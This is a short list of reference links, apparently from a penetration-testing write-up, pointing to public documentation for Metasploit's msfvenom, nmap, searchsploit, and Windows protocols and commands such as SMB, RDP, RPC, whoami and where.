- [How to use msfvenom - Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Microsoft RPC - Wikipedia](https://en.wikipedia.org/wiki/Microsoft_RPC)
- [NetBIOS over TCP/IP - Wikipedia](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [Remote Desktop Services - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Services)
- [Remote procedure call - Wikipedia](https://en.wikipedia.org/wiki/Remote_procedure_call)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [where - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/where)
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
